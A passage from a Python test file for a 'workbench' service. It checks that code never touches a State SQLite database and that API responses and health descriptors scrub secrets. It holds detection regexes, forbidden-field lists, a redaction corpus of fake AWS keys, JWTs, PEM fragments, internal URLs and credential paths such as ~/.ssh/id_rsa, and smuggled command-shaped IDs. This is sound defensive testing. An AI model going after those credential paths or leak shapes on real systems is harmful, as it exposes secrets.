from __future__ import annotations

import json
import re
from pathlib import Path

import pytest

from workbench.bridge import BridgeSettings, StateReader
from workbench.graph import GraphError, NullGraph
from workbench.store import MemoryStore, StoreError
from workbench.voice import summarize_server_event

_REPO_ROOT = Path(__file__).resolve().parents[1]

#: State's SQLite storage: ``state.db`` (which also matches its ``-journal``,
#: ``-wal``, and ``-shm`` siblings) plus any ``.anvil``-adjacent ``state``
#: workspace path, however the path is joined (``.anvil/state.db``,
#: ``".anvil" / "state.db"``, ``.anvil\\state.db``).
_STATE_STORAGE = re.compile(r"state\.db|\.anvil\W{0,6}state", re.IGNORECASE)

#: The only allowlisted form: a documentation string that states the
#: prohibition itself ("it never opens or mutates ``state.db``").
_PROHIBITION_DOC = re.compile(
    r"(never|must\s+not|do(es)?\s+not|cannot)[^\n]{0,80}(open|copy|copie|mount|mutat|modif)",
    re.IGNORECASE,
)

#: Workbench durable records live in Postgres or the hermetic MemoryStore; the
#: only supported State read paths are the State CLI and the canonical event
#: stream. Any SQLite use in hub, bridge, or browser source is therefore a
#: candidate direct ``state.db`` access and fails this scan outright.
_SQLITE = re.compile(r"sqlite|\bapsw\b", re.IGNORECASE)

#: Bulk-copy primitives copy State storage without ever naming it (a
#: directory-level copy of a supervised worktree includes ``.anvil``), so
#: Workbench Python sources may not use them at all; a legitimate future need
#: must consciously revise this boundary test.
_BULK_COPY = re.compile(r"\bcopytree\b|\bmake_archive\b|\bZipFile\b|\btarfile\b")


def _scanned_sources() -> list[Path]:
    workbench_sources = sorted((_REPO_ROOT / "workbench").rglob("*.py"))
    web_sources: list[Path] = []
    web_root = _REPO_ROOT / "web"
    for suffix in (".js", ".jsx", ".ts", ".tsx"):
        web_sources.extend(sorted((web_root / "src").rglob(f"*{suffix}")))
        web_sources.extend(sorted(web_root.glob(f"*{suffix}")))
    # The scan must actually see BOTH surfaces; losing either directory (a
    # rename, a glob typo) must fail loudly, not silently stop proving.
    assert len(workbench_sources) >= 15, workbench_sources
    assert len(web_sources) >= 1, web_sources
    return workbench_sources + web_sources


def test_no_workbench_source_opens_copies_mounts_or_mutates_state_storage():
    # AGENTS.md boundary: "Never open, mount, or mutate state.db." This scan
    # proves it for every hub, bridge, and browser source file. An open
    # (sqlite3), copy (shutil), mount, or mutation must name the storage path
    # to touch it, so banning the path literal closes every access verb; the
    # separate sqlite ban closes the driver even for a computed path.
    violations: list[str] = []
    prohibition_docs = 0
    for source in _scanned_sources():
        relative = source.relative_to(_REPO_ROOT).as_posix()
        for number, line in enumerate(source.read_text(encoding="utf-8").splitlines(), start=1):
            stripped = line.strip()
            if _STATE_STORAGE.search(line):
                # Allowlist: documentation-only lines — a comment line or a
                # pure prose line inside a docstring. A line containing any
                # executable code (assignment, call, etc.) is never exempt,
                # even when a warning comment rides on it.
                is_documentation = stripped.startswith("#") or (
                    "=" not in line and "(" not in line
                )
                if is_documentation and _PROHIBITION_DOC.search(line):
                    prohibition_docs += 1
                else:
                    violations.append(f"{relative}:{number}: state storage reference: {stripped}")
            if _SQLITE.search(line):
                violations.append(f"{relative}:{number}: sqlite reference: {stripped}")
            if source.suffix == ".py" and _BULK_COPY.search(line):
                violations.append(f"{relative}:{number}: bulk-copy primitive: {stripped}")
    assert violations == []
    # The allowlist must stay documentation-only, and the scanner must remain
    # sensitive enough to see the one docstring that states the prohibition.
    assert prohibition_docs >= 1


def test_unimplemented_privileged_actions_cannot_create_a_dangling_bridge_command():
    store = MemoryStore()
    project = store.create_project("demo", ".anvil")
    bridge, _token = store.register_bridge(project.id, "project bridge")
    with pytest.raises(StoreError, match="not executable"):
        store.create_approval(
            project.id, "model_policy", {"profile": "different"}, "operator", 60, bridge.id,
        )


def test_graph_only_accepts_redacted_evidence_metadata():
    graph = NullGraph()
    citation = graph.project("route", "req_1", "project_1", {"task_id": "task_1", "served_tier": "heavy-local", "token": "secret=abc"})
    assert len(citation) == 64
    with pytest.raises(GraphError, match="transcripts"):
        graph.project("transcript", "run_1", "project_1", {"text": "do not index"})
    with pytest.raises(GraphError, match="transcripts"):
        graph.project("evidence", "run_1", "project_1", {"messages": ["raw"]})


def test_voice_summaries_never_persist_audio_even_when_transcripts_are_retained():
    # The chat-turn contract prohibits raw audio in durable records; the relay's
    # summarizer is the only path into storage, so even the most permissive
    # retention setting must reduce an audio delta to byte-count metadata.
    audio_frame = '{"type":"response.output_audio.delta","delta":"UklGRiQAAABXQVZF"}'
    for retain in (False, True):
        kind, data = summarize_server_event(audio_frame, retain_transcripts=retain)
        assert kind == "voice.tts.chunk"
        assert data == {"bytes": 16}
        assert "UklGRiQAAABXQVZF" not in json.dumps(data)


def test_state_reader_tails_canonical_events_without_database_access(tmp_path: Path):
    events = tmp_path / ".anvil" / "events.jsonl"
    events.parent.mkdir()
    events.write_text(json.dumps({"id": "event_1", "task_id": "task_48", "kind": "evidence"}) + "\n", encoding="utf-8")
    settings = BridgeSettings(
        hub="https://workbench.tailnet.example", bridge_id="bridge_1", token="token", project_root=tmp_path,
        project_id="project_1", state_events=events, cursor_file=tmp_path / ".workbench" / "cursor",
        state_status_command="anvil status", state_claim_command="anvil claim {task_id} --actor {actor}",
        state_work_packet_command="anvil packet {task_id} --format json",
        state_hook_command="anvil hook capture-evidence", state_submit_command="anvil submit {task_id}",
        state_apply_command="", codex_binary="codex",
        router_base_url="http://100.87.34.66:8000/v1", router_token_env="ANVIL_ROUTER_TOKEN", codex_config=(),
    )
    reader = StateReader(settings)
    items = list(reader.new_events())
    assert items[0][1]["id"] == "event_1"
    reader.commit_cursor(items[0][0])
    assert list(reader.new_events()) == []
    assert not (tmp_path / ".anvil" / "state.db").exists()


# --- project-context browser response safety (state-context-operations T003.3 /
# T003.4): the rendered read-model response carries no State-internal FIELD
# (storage path, credential, execution surface), and credential-shaped strings
# seeded into readable State prose are scrubbed on the last hop, even when the
# underlying State prose is adversarially seeded with secrets.
#
# Scope note: `redact_text` scrubs recognizable CREDENTIALS (api-key/token/
# secret/Bearer patterns), not filesystem paths or URLs. `project_name` and
# other display prose are untrusted State-owned strings that are served as-is
# apart from credential scrubbing (a documented decision). This scan therefore
# proves (a) no State-internal field name is representable and (b) credentials
# are scrubbed -- NOT that a user who types a path-like string into a project
# title would have it rewritten. The value-level path markers below assert the
# fixture's own prose stays path-free, so a future projection field that DID
# splice a State path into the response would trip this test. ------------------

_CTX_ROOT = Path(__file__).resolve().parents[1]
_CTX_CATALOG = _CTX_ROOT / "docs" / "contracts" / "examples" / "anvil-state.catalog.v1.json"
_CTX_SNAPSHOT = _CTX_ROOT / "docs" / "contracts" / "examples" / "anvil-state.project-snapshot.v1.json"


def _seeded_projection_response() -> dict:
    """Render a project-context API response from a secret-seeded snapshot."""
    from fastapi.testclient import TestClient

    from workbench.api import create_app
    from workbench.config import Settings
    from workbench.contracts import contract_digest
    from workbench.project_context import ProjectContextProjection
    from workbench.project_context_store import MemoryProjectContextStore
    from workbench.state_manifest import pin_state_read_operations
    from workbench.state_snapshot_adapter import validate_snapshot_payload

    operation = pin_state_read_operations(json.loads(_CTX_CATALOG.read_text(encoding="utf-8"))).project_snapshot
    payload = json.loads(_CTX_SNAPSHOT.read_text(encoding="utf-8"))
    # Adversarially seed the readable prose with credential-shaped strings; the
    # display projection must scrub them on the last hop before the browser.
    payload["project"]["name"] = "Bearer sk-live-abc123DEADBEEF secret project"
    payload["tasks"][0]["title"] = "Fix token=supersecretvalue in api_key=leak"
    payload["snapshot_digest"] = contract_digest("state-snapshot", payload)
    projection = ProjectContextProjection.from_snapshot(validate_snapshot_payload(payload, operation))

    store = MemoryProjectContextStore()
    store.publish(projection.project_id, projection)
    settings = Settings(
        database_url="unused", neo4j_uri="unused", neo4j_user="neo4j", neo4j_password="",
        owner="operator", approvers=frozenset({"operator"}), bridge_bootstrap_token="",
        anvil_router_base_url="", anvil_router_token="",
        identity_header="X-Workbench-Actor", allow_insecure_dev_actor=True,
    )
    app = create_app(settings=settings, store=MemoryStore(), graph=NullGraph(), project_context_store=store)
    with TestClient(app) as client:
        response = client.get(
            f"/api/projects/{projection.project_id}/context",
            headers={"X-Workbench-Actor": "operator"},
        )
        assert response.status_code == 200, response.text
        return response.json()["context"]


def _walk_ctx(value, keys: list[str], strings: list[str]) -> None:
    if isinstance(value, dict):
        for key, nested in value.items():
            keys.append(key)
            _walk_ctx(nested, keys, strings)
    elif isinstance(value, list):
        for nested in value:
            _walk_ctx(nested, keys, strings)
    elif isinstance(value, str):
        strings.append(value)


def test_project_context_browser_response_exposes_no_state_path_credential_or_payload():
    context = _seeded_projection_response()
    keys: list[str] = []
    strings: list[str] = []
    _walk_ctx(context, keys, strings)

    # No serialized FIELD NAME names a State-storage, credential, or execution
    # surface. (Free-text values legitimately contain "adapter"/"command"
    # substrings like "...project-snapshot adapter", so those are name-scanned.)
    forbidden_key_markers = (
        "state", "sqlite", "journal", "wal", "shm", "path", "mount", "db",
        "token", "secret", "api_key", "apikey", "password", "credential", "bearer",
        "adapter", "command", "argv", "execute", "endpoint", "route", "provider_catalog",
    )
    for key in keys:
        lowered = key.lower()
        for marker in forbidden_key_markers:
            assert marker not in lowered, f"response field {key!r} looks like a {marker!r} surface"

    # The adversarial secrets seeded into State prose are scrubbed, never served
    # verbatim; the redaction marker proves the last-hop scrub ran.
    blob = json.dumps(context)
    for leaked in ("sk-live-abc123DEADBEEF", "supersecretvalue", "Bearer sk-live"):
        assert leaked not in blob
    assert "[REDACTED]" in blob

    # No serialized VALUE carries a State-storage path or URL. This proves the
    # projection does not SPLICE a State-internal path into any rendered value --
    # not that user-chosen prose is path-scrubbed (`redact_text` scrubs
    # credentials, not paths). The fixture prose is deliberately path-free, so a
    # regression that started emitting a `state.db`/`.anvil` path into a value
    # would trip here.
    for value in strings:
        lowered = value.lower()
        for marker in ("state.db", ".anvil", "-wal", "-shm", "://"):
            assert marker not in lowered, f"response value {value!r} leaked {marker!r}"


# --- historical run-context response safety (state-context-operations T005.3 /
# T005.4): the rendered queue-time run context keeps trusted policy and
# untrusted PRD/task data in two separately labeled structures, exposes no
# State-internal FIELD (storage path, credential, execution surface), and scrubs
# credential-shaped strings seeded into the untrusted prose on the last hop. ----


def _seeded_run_context_response() -> dict:
    """Render a historical run-context response from secret-seeded task prose."""
    from fastapi.testclient import TestClient

    from _support import build_run_context
    from workbench.api import create_app
    from workbench.config import Settings
    from workbench.models import UntrustedEvidence, UntrustedTask, UntrustedTaskRef
    from workbench.run_context_store import MemoryRunContextStore

    context = build_run_context(
        task=UntrustedTask(
            ref=UntrustedTaskRef(prd_id="release-beta", task_id="T001", prd_revision=5),
            title="Fix token=supersecretvalue in api_key=leak",
            acceptance_criteria=("Rotate Bearer sk-live-abc123DEADBEEF now",),
            work_packet_digest="sha256:" + "8" * 64,
        ),
        evidence=(UntrustedEvidence(citation="state-event:1", summary="secret=zzz seen"),),
    )
    store = MemoryRunContextStore()
    store.capture("project_a", context)
    settings = Settings(
        database_url="unused", neo4j_uri="unused", neo4j_user="neo4j", neo4j_password="",
        owner="operator", approvers=frozenset({"operator"}), bridge_bootstrap_token="",
        anvil_router_base_url="", anvil_router_token="",
        identity_header="X-Workbench-Actor", allow_insecure_dev_actor=True,
    )
    app = create_app(settings=settings, store=MemoryStore(), graph=NullGraph(), run_context_store=store)
    with TestClient(app) as client:
        response = client.get(
            f"/api/projects/project_a/runs/{context.run_id}/context",
            headers={"X-Workbench-Actor": "operator"},
        )
        assert response.status_code == 200, response.text
        return response.json()["context"]


def test_run_context_browser_response_separates_trust_and_exposes_no_leak():
    context = _seeded_run_context_response()

    # Two separately labeled trust structures.
    assert context["trusted"]["trust"] == "trusted_execution_policy"
    assert context["untrusted"]["content_trust"] == "untrusted_task_data"

    keys: list[str] = []
    strings: list[str] = []
    _walk_ctx(context, keys, strings)

    # No serialized FIELD NAME names a State-storage, credential, or raw
    # execution surface. (Effect/gate enums are safe policy words; the closed
    # run-context field set has no execution/adapter/command field at all.)
    forbidden_key_markers = (
        "state_db", "sqlite", "journal", "wal", "shm", "mount",
        "token", "secret", "api_key", "apikey", "password", "credential", "bearer",
        "adapter", "argv", "command", "input_schema", "output_schema",
    )
    for key in keys:
        lowered = key.lower()
        for marker in forbidden_key_markers:
            assert marker not in lowered, f"run-context field {key!r} looks like a {marker!r} surface"

    # The adversarial secrets seeded into the untrusted prose are scrubbed.
    blob = json.dumps(context)
    for leaked in ("supersecretvalue", "sk-live-abc123DEADBEEF", "zzz"):
        assert leaked not in blob
    assert "[REDACTED]" in blob

    # No serialized VALUE carries a State-storage path or URL.
    for value in strings:
        lowered = value.lower()
        for marker in ("state.db", ".anvil", "-wal", "-shm", "://"):
            assert marker not in lowered, f"run-context value {value!r} leaked {marker!r}"


#: The proven-leak corpus (state-context-operations security lens): every one of
#: these classes was demonstrated to ride UNSCRUBBED through the run-context
#: response before the untrusted channel was routed through the hardened
#: config-class scrubber.  Each is a shape the transcript credential scrub
#: (``redact_text``) misses -- so a revert of the untrusted-prose scrub or the
#: API last-hop back to ``redact_text`` MUST make the assertions below fail.
_RUN_CONTEXT_LEAK_CORPUS = {
    "AKIA-no-separator": "AKIAIOSFODNN7EXAMPLE",
    "JWT": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
    "PEM-private-key": "-----BEGIN RSA PRIVATE KEY-----MIIBdeadbeefCAFE-----END RSA PRIVATE KEY-----",
    "ip:port": "100.64.0.5:8443",
    "postgres-url": "postgres://svc:pw@db.internal:5432/anvil",
    "state.db-path": "/var/anvil/state.db",
}


def _corpus_field(prefix: str) -> str:
    """Readable prose carrying every proven-leak class in one untrusted field."""
    return prefix + " " + " ".join(_RUN_CONTEXT_LEAK_CORPUS.values())


def _seeded_run_context_response_full_corpus() -> dict:
    """Render a run-context response with the full corpus in EVERY untrusted field."""
    from fastapi.testclient import TestClient

    from _support import build_run_context
    from workbench.api import create_app
    from workbench.config import Settings
    from workbench.models import UntrustedEvidence, UntrustedTask, UntrustedTaskRef
    from workbench.run_context_store import MemoryRunContextStore

    context = build_run_context(
        task=UntrustedTask(
            ref=UntrustedTaskRef(prd_id="release-beta", task_id="T001", prd_revision=5),
            title=_corpus_field("title"),
            acceptance_criteria=(_corpus_field("criterion"),),
            work_packet_digest="sha256:" + "8" * 64,
            scope=(_corpus_field("scope"),),
            verification_plan=(_corpus_field("verify"),),
        ),
        evidence=(
            UntrustedEvidence(
                citation=_corpus_field("cite"),
                summary=_corpus_field("summary"),
            ),
        ),
    )
    store = MemoryRunContextStore()
    store.capture("project_a", context)
    settings = Settings(
        database_url="unused", neo4j_uri="unused", neo4j_user="neo4j", neo4j_password="",
        owner="operator", approvers=frozenset({"operator"}), bridge_bootstrap_token="",
        anvil_router_base_url="", anvil_router_token="",
        identity_header="X-Workbench-Actor", allow_insecure_dev_actor=True,
    )
    app = create_app(settings=settings, store=MemoryStore(), graph=NullGraph(), run_context_store=store)
    with TestClient(app) as client:
        response = client.get(
            f"/api/projects/project_a/runs/{context.run_id}/context",
            headers={"X-Workbench-Actor": "operator"},
        )
        assert response.status_code == 200, response.text
        return response.json()["context"]


def test_run_context_untrusted_prose_scrubs_full_proven_leak_corpus():
    # Security lens (proven end-to-end): a secret/host-path/DB-URL/PEM/JWT/AKIA
    # seeded into ANY untrusted PRD/task/acceptance/scope/evidence prose field
    # must NOT render through GET .../runs/{run_id}/context. Each class is a
    # separate negative assertion with its class marker, so a revert of the
    # untrusted-channel scrub back to the transcript scrub fails this test.
    context = _seeded_run_context_response_full_corpus()

    # The trusted structure is left byte-for-byte as captured (no over-redaction).
    assert context["trusted"]["trust"] == "trusted_execution_policy"
    assert context["untrusted"]["content_trust"] == "untrusted_task_data"

    blob = json.dumps(context)
    for marker, literal in _RUN_CONTEXT_LEAK_CORPUS.items():
        assert literal not in blob, f"untrusted run-context prose leaked a {marker!r} value: {literal!r}"

    # Distinctive fragments (a partial leak is still a leak) are gone too.
    for fragment in ("AKIAIOSFODNN7", "eyJhbGci", "BEGIN RSA PRIVATE KEY", "100.64.0.5", "db.internal", "state.db"):
        assert fragment not in blob, f"untrusted run-context prose leaked fragment {fragment!r}"

    # And the untrusted channel actually carried a redaction marker (proof the
    # scrub ran rather than the corpus silently vanishing).
    untrusted_blob = json.dumps(context["untrusted"])
    assert "[REDACTED" in untrusted_blob


# --- system-health integration descriptors + observational posture audit
# (preferences-configuration T003.1 / T008): every descriptor and posture check
# is an observational display record whose closed field set structurally cannot
# carry a secret, a raw endpoint URL, a local path, an approval, or an execution
# surface; readable prose is scrubbed on construction; and the audit is
# deterministic with stable check IDs. These are the shared fixtures that guard
# BOTH the descriptor safety (T003.1) and the audit's no-mutation claim (T008
# criterion 2, "proven by the same fixtures that guard T003"). --------------

from _support import SYSTEM_HEALTH_DESCRIPTOR_FIELDS

from workbench.config import Settings as _SHSettings
from workbench.system_health import (
    INTEGRATION_IDS as _SH_INTEGRATION_IDS,
    IntegrationDescriptor as _SHDescriptor,
    PostureCheck as _SHCheck,
    build_integration_descriptors as _sh_build,
    run_posture_audit as _sh_audit,
)

#: A field NAME here would betray a credential, endpoint, local path, or an
#: approval/execution surface. The closed display shapes must expose none of
#: them -- an observational descriptor can never become an actuator.
_SH_FORBIDDEN_FIELD_MARKERS = (
    "token", "secret", "password", "credential", "api_key", "apikey", "bearer",
    "url", "uri", "endpoint", "host", "argv", "command", "cmd",
    "approve", "approval", "execute", "exec", "mutate", "action",
)

#: The exact closed field set a descriptor may serialize. A field added outside
#: this set (leak-by-addition) must fail, so the assertion is not a tautology.
#: Imported from ``conftest`` so this list and its twin in ``test_api.py`` cannot
#: drift apart (a single source of truth for the closed shape).
_SH_ALLOWED_DESCRIPTOR_FIELDS = SYSTEM_HEALTH_DESCRIPTOR_FIELDS
#: The six things T003.1 requires every descriptor to expose, always present.
_SH_REQUIRED_DESCRIPTOR_FIELDS = frozenset({
    "state", "configured", "digest", "last_checked_at", "owner",
    "dependencies", "remediation",
})


def _sh_settings(**overrides) -> _SHSettings:
    base = dict(
        database_url="unused", neo4j_uri="unused", neo4j_user="neo4j", neo4j_password="",
        owner="operator", approvers=frozenset({"operator"}), bridge_bootstrap_token="",
        anvil_router_base_url="", anvil_router_token="",
        identity_header="X-Workbench-Actor", allow_insecure_dev_actor=False,
    )
    base.update(overrides)
    return _SHSettings(**base)


def test_system_health_descriptor_exposes_the_required_closed_field_set():
    # T003.1 criterion 1: each descriptor exposes configured state, version/
    # digest, last check, safe owner, dependencies, and remediation -- and, by
    # the closed allowlist, structurally nothing that names a credential, an
    # endpoint, a local path, or an approval/execution surface.
    descriptors = _sh_build(_sh_settings(), checked_at="2026-07-21T00:00:00Z", bridge_health="degraded")
    seen_ids = {descriptor.integration_id for descriptor in descriptors}
    # Every declared integration is described (T003.2 criterion 1 relies on this).
    assert seen_ids == set(_SH_INTEGRATION_IDS)
    for descriptor in descriptors:
        data = descriptor.as_dict()
        extra = set(data) - _SH_ALLOWED_DESCRIPTOR_FIELDS
        assert not extra, f"descriptor leaked field(s) by addition: {sorted(extra)}"
        missing = _SH_REQUIRED_DESCRIPTOR_FIELDS - set(data)
        assert not missing, f"descriptor omits required field(s): {sorted(missing)}"
        # version/digest: the digest is always present and content-addressed.
        assert data["digest"].startswith("sha256:")
        for key in data:
            lowered = key.lower()
            for marker in _SH_FORBIDDEN_FIELD_MARKERS:
                assert marker not in lowered, f"descriptor field {key!r} looks like a {marker!r} surface"


_BS = chr(92)  # a single backslash, kept out of the f-strings below.

#: The full adversarial redaction corpus (three-lens finding 1): one probe per
#: proven-leaking shape across all four declared classes. Each entry is
#: ``(fragment, [tokens that must be gone], expected marker)``. Every fragment is
#: a shape a NARROWED scrub returned unchanged, so each is an independent
#: negative assertion -- reverting ``redact_config_text`` to the old patterns
#: must make at least one of these fail.
_SH_REDACTION_CORPUS = (
    # --- credentials / secrets ---
    ("AKIAIOSFODNN7EXAMPLE", ["AKIAIOSFODNN7EXAMPLE"], "[REDACTED]"),
    ("aws_secret_access_key=wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY",
     ["wJalrXUtnFEMI", "wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY"], "[REDACTED]"),
    ("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.dozjgNryP4J3jVmNHl0w",
     ["eyJhbGci", "eyJzdWIi"], "[REDACTED]"),
    ("-----BEGIN RSA PRIVATE KEY-----MIIEpQIBAAKCAQ-----END RSA PRIVATE KEY-----",
     ["MIIEpQIBAAKCAQ", "BEGIN RSA PRIVATE KEY"], "[REDACTED]"),
    # --- sensitive raw URLs / endpoints ---
    ("reach it at 100.64.0.5:8443 today", ["100.64.0.5"], "[REDACTED-URL]"),
    ("bolt db.tail1234.ts.net:7687", ["tail1234", "7687", "ts.net"], "[REDACTED-URL]"),
    ("serving.tail1234.ts.net", ["serving.tail1234", "ts.net"], "[REDACTED-URL]"),
    ("jump to //internalhost/admin now", ["//internalhost"], "[REDACTED-URL]"),
    ("Server=db.internal;Password=hunter2;", ["db.internal", "hunter2"], "[REDACTED-URL]"),
    ("https://100.87.34.66:8000/v1", ["100.87.34.66", "://"], "[REDACTED-URL]"),
    # --- local paths ---
    ("path=/etc/anvil/secret.conf", ["/etc/anvil"], "[REDACTED-PATH]"),
    ("file:/var/lib/secrets/key", ["/var/lib/secrets"], "[REDACTED-PATH]"),
    ("see (/opt/anvil/private) here", ["/opt/anvil"], "[REDACTED-PATH]"),
    (_BS + _BS + "fileserver" + _BS + "secrets", ["fileserver"], "[REDACTED-PATH]"),
    ("C:" + _BS + "Users" + _BS + "me" + _BS + "creds.json", ["Users" + _BS + "me"], "[REDACTED-PATH]"),
    ("key at ~/.ssh/id_rsa here", ["~/.ssh", "id_rsa"], "[REDACTED-PATH]"),
    ("load deploy/.env please", ["deploy/.env"], "[REDACTED-PATH]"),
    ("certs/server.pem", ["certs/server.pem"], "[REDACTED-PATH]"),
    ("prod.env", ["prod.env"], "[REDACTED-PATH]"),
    ("backup.pem", ["backup.pem"], "[REDACTED-PATH]"),
    ("/home/operator/private/key", ["/home/operator"], "[REDACTED-PATH]"),
)


def test_system_health_descriptor_scrubs_seeded_credential_url_and_path_on_construction():
    # T003.1 criterion 2: the redaction layer removes ENTIRE declared classes --
    # secrets/credentials, sensitive raw URLs/endpoints, AND local paths. Seed
    # every proven-leaking shape (finding 1 corpus) into descriptor prose, one at
    # a time, and prove each specific token is gone and its class marker present.
    for fragment, gone_tokens, marker in _SH_REDACTION_CORPUS:
        seeded = f"remediation prose {fragment} tail text"
        descriptor = _SHDescriptor(
            integration_id="anvil_serving", title="Anvil Serving model plane",
            state="disabled", configured=False, owner="anvil-serving", remediation=seeded,
        )
        blob = json.dumps(descriptor.as_dict())
        for token in gone_tokens:
            assert token not in blob, f"{fragment!r}: leaked {token!r} -> {descriptor.remediation!r}"
        assert marker in blob, f"{fragment!r}: expected {marker} -> {descriptor.remediation!r}"
        # The digest commits to the scrubbed content, so it too is leak-free.
        for token in gone_tokens:
            assert token not in descriptor.digest
        # Readable prose survives around the scrubbed shape.
        assert "remediation prose" in descriptor.remediation and "tail text" in descriptor.remediation

    # A single descriptor carrying one of every class at once is fully scrubbed.
    seeded = (
        "token=supersecretvalue reach it at https://100.87.34.66:8000/v1 "
        "win C:" + _BS + "Users" + _BS + "me" + _BS + "creds.json "
        "posix /home/operator/private/key"
    )
    descriptor = _SHDescriptor(
        integration_id="anvil_serving", title="Anvil Serving model plane",
        state="disabled", configured=False, owner="anvil-serving", remediation=seeded,
    )
    blob = json.dumps(descriptor.as_dict())
    assert "supersecretvalue" not in blob and "[REDACTED]" in blob
    assert "100.87.34.66" not in blob and "://" not in blob and "[REDACTED-URL]" in blob
    assert "Users" + _BS + "me" not in blob and "/home/operator" not in blob and "[REDACTED-PATH]" in blob
    assert "supersecretvalue" not in descriptor.digest


def test_unconfigured_integrations_report_truthful_disabled_states_with_safe_remediation():
    # T003.1 criterion 4: an all-unset deployment yields truthful disabled
    # descriptors (never a false "ready"), each with non-empty remediation that
    # carries no secret, URL, or path -- only safe public env-var names.
    descriptors = _sh_build(_sh_settings(), checked_at="2026-07-21T00:00:00Z", bridge_health=None)
    for descriptor in descriptors:
        assert descriptor.state == "disabled"
        assert descriptor.configured is False
        assert descriptor.remediation
        lowered = descriptor.remediation.lower()
        for marker in ("[redacted]", "://", "supersecret"):
            assert marker not in lowered, f"remediation leaked {marker!r}: {descriptor.remediation!r}"


def test_system_health_descriptor_construction_is_read_only_and_has_no_effect_surface():
    # T003.1 criterion 3: descriptor construction can neither trigger nor approve
    # a change. The frozen value has no mutator and no effect field; the type
    # rejects an unknown integration and a self-dependency (an id can never carry
    # a smuggled edge), so it is purely observational.
    descriptor = _sh_build(_sh_settings(), checked_at="2026-07-21T00:00:00Z")[0]
    with pytest.raises(Exception):
        descriptor.state = "ready"  # frozen: cannot mutate observed state
    with pytest.raises(ValueError, match="unknown integration_id"):
        _SHDescriptor(
            integration_id="run_codex", title="x", state="ready", configured=True,
            owner="operator", remediation="x",
        )
    with pytest.raises(ValueError, match="depend on itself"):
        _SHDescriptor(
            integration_id="anvil_serving", title="x", state="ready", configured=True,
            owner="anvil-serving", remediation="x", dependencies=("anvil_serving",),
        )


def test_posture_audit_is_deterministic_with_stable_ids_and_no_secret_or_path():
    # T008 criterion 1: every check has a stable id and a deterministic result
    # for identical configuration, with remediation free of secrets and paths.
    # Configure the plane with secret-shaped VALUES; the audit reads only
    # booleans, so no value can reach a finding.
    settings = _sh_settings(
        anvil_router_base_url="https://100.87.34.66:8000/v1",
        anvil_router_token="sk-live-DEADBEEFsupersecret",
        neo4j_password="/var/secrets/neo4j.pass",
        allow_insecure_dev_actor=True,
    )
    first = _sh_audit(settings, checked_at="2026-07-21T00:00:00Z", bridge_health="degraded")
    # Determinism: a different observation time yields byte-identical findings.
    second = _sh_audit(settings, checked_at="2099-12-31T23:59:59Z", bridge_health="degraded")
    assert first.findings() == second.findings()
    ids = [check.check_id for check in first.checks]
    assert ids == sorted(ids) and len(ids) == len(set(ids))  # stable, unique, ordered
    assert "posture.security.insecure_dev_actor" in ids
    blob = json.dumps(first.findings())
    for leaked in ("supersecret", "DEADBEEF", "100.87.34.66", "/var/secrets", "://"):
        assert leaked not in blob, f"posture finding leaked {leaked!r}"
    # Each finding's status is a bounded enum -- never a raw internal string.
    for check in first.checks:
        assert check.status in {"ok", "attention", "disabled"}


def test_posture_check_rejects_a_smuggled_execution_shaped_id():
    # T008: a check id is a stable observational label, not a command name; the
    # grammar requires the dotted ``posture.<segment>`` form, so a finding can
    # never smuggle an executable/approval token through its identifier. A
    # command with an argument, AND a bare command-shaped id with no dotted
    # ``posture.`` prefix, are both refused (the grammar is genuinely dotted-only,
    # not merely space-free).
    for smuggled in ("run_codex --now", "run_codex", "merge_and_accept", "posture"):
        with pytest.raises(ValueError, match="check_id is invalid"):
            _SHCheck(check_id=smuggled, title="x", status="ok", severity="info", remediation="x")
    # The real dotted ids the audit emits stay valid.
    for good in ("posture.integration.anvil_serving", "posture.security.insecure_dev_actor"):
        assert _SHCheck(check_id=good, title="x", status="ok", severity="info", remediation="x").check_id == good


# ---------------------------------------------------------------------------
# Typed operation spine: no secret, path, command, or capability leak
# (state-context-operations:T006.1 / T006.2 / T006.3)
# ---------------------------------------------------------------------------

#: The exact closed top-level field set an operation receipt may serialize, so a
#: leak-by-addition (an extra field) fails the assertion rather than passing it.
_RECEIPT_ALLOWED_FIELDS = frozenset({
    "schema_version", "receipt_id", "command_id", "run_id", "operation", "status",
    "idempotency_key", "external_ref", "evidence_refs", "correlation", "redaction",
    "error", "started_at", "finished_at",
})


def test_operation_refusal_summary_scrubs_seeded_credentials_urls_and_paths():
    from workbench.models import OperationRefusal

    # A path/URL summary (no bare credential-class word) is scrubbed to markers.
    refusal = OperationRefusal(
        "operation.digest_drift",
        r"drift observed for config at C:\creds\prod.env reached via https://serving.tail1234.ts.net:8443/x",
    )
    assert "[REDACTED-PATH]" in refusal.safe_summary
    assert "[REDACTED-URL]" in refusal.safe_summary
    assert "prod.env" not in refusal.safe_summary
    assert "serving.tail1234.ts.net" not in refusal.safe_summary

    # A summary literally naming a credential class is refused by the receipt
    # schema, so the forbidden-token guard replaces it wholesale rather than
    # letting "Bearer sk-..." or "secret" ride into a receipt.
    leaky = OperationRefusal("approval.invalid", "Bearer sk-abcdefgh12345678 leaked the api_key secret value")
    assert leaky.safe_summary == "operation refused; consult the typed refusal code"
    for token in ("sk-abcdefgh", "Bearer", "secret", "api_key"):
        assert token not in leaky.safe_summary


def test_operation_receipt_external_ref_scrubs_credentials_paths_and_rejects_free_text():
    # T006.3 criterion #2 / OperationReceipt's stated guarantee: no field lets a
    # secret, a raw command, or a PATH ride into a schema-valid receipt. The
    # bounded external_ref pattern alone did NOT hold that: it admits `/` and `:`
    # so a legit owner/repo ref survives, which means a slash-free credential
    # token or a path built only from [A-Za-z0-9._:/-] passes the pattern and
    # would have ridden through verbatim. external_ref values now get the SAME
    # last-hop scrub as error.safe_summary. This asserts the guarantee that
    # actually holds: (a) free-text shapes fail the structural backstop, and
    # (b) every proven credential/path shape is scrubbed away in BOTH the
    # persisted receipt and the reconciliation record.
    from workbench.models import (
        OperationRef, OperationReceipt, ReconciliationItem, RunContextError,
        new_receipt_id, new_reconciliation_id,
    )
    from datetime import datetime, timezone

    operation = OperationRef("anvil-state", "state.evidence.submit", "1.0.0", "sha256:" + "4" * 64)
    now = datetime.now(timezone.utc)

    # (a) STRUCTURAL BACKSTOP: a value with a space, a credential assignment, a
    # query string, or an '@' is not a bounded opaque token, so the receipt
